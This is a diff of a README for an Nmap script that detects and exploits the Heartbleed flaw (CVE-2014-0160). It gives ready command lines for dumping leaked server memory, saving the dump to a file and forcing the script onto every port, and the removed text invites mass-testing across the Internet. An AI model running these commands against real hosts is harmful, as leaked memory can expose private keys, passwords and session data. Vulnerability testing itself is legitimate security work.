@@ -1,31 +1,31 @@
-openssl-heartbleed.nse
+ssl-heartbleed.nse
 ======================
 
-Nmap NSE script that discovers/exploits Heartbleed/CVE-2014-0160. It is still in PoC state, so use with caution. This is supposed to make mass-testing easier. Take it on a trip through the Internet!
+Nmap NSE script that discovers/exploits Heartbleed/CVE-2014-0160. This script is now basically the one Patrik Karlsson wrote with some minor changes ported from my own script.
 
-Due to experimental state it is not yet supposed to be put in the Nmap scripts dir unless you really know what you are doing.
+### Features
+* Includes support for FTP,SMTP,XMPP (https://github.com/nmap/nmap/blob/master/nselib/sslcert.lua#L231).
+* Supports all versions of TLS (TLSv1.0, TLSv1.1, TLSv1.2).
+* Print leaked memory as hex dump.
+* Dump leaked memory into a file.
 
 ### Usage
-#### Check if a host is vulnerable (runs on every SSL/TLS port)
+#### Check if a host is vulnerable
+This runs on every SSL, FTP, SMTP and/or XMPP port.
 ```
-$ nmap --script=./openssl-heartbleed.nse host.tld
+$ nmap --script ./openssl-heartbleed.nse host.tld
 ```
 #### Dump leaked memory from a vulnerable host
 Dumping leaked memory is enabled by increasing Nmap's debug level via -d flag.
 ```
 $ nmap -d --script=./openssl-heartbleed.nse host.tld
 ```
-
-### Example Output
+#### Dump leaked memory into a file
 ```
-[ ~/temp/heartbleed ] nmap -p443 --script=./openssl-heartbleed.nse local.de 
-
-Starting Nmap 6.41SVN ( http://nmap.org ) at 2014-04-09 01:58 CEST
-Nmap scan report for tune.pk (172.23.0.1)
-Host is up (0.12s latency).
-PORT    STATE SERVICE
-443/tcp open  https
-|_openssl-heartbleed: Host is vulnerable to TLS heartbeat read overrun (CVE-2014-0160). Increase debug level for a dump of leaked data.
-
-Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
+$ nmap --script ./ssl-heartbleed.nse --script-args 'ssl-heartbleed.dumpfile=/tmp/heartbleed.dump' host.tld
+```
+#### Run ssl-heartbleed.nse against every port
+Force the script to run on each port, regardless if the servie was detected or not.
+```
+$ nmap --script +./ssl-heartbleed.nse host.tld
 ```
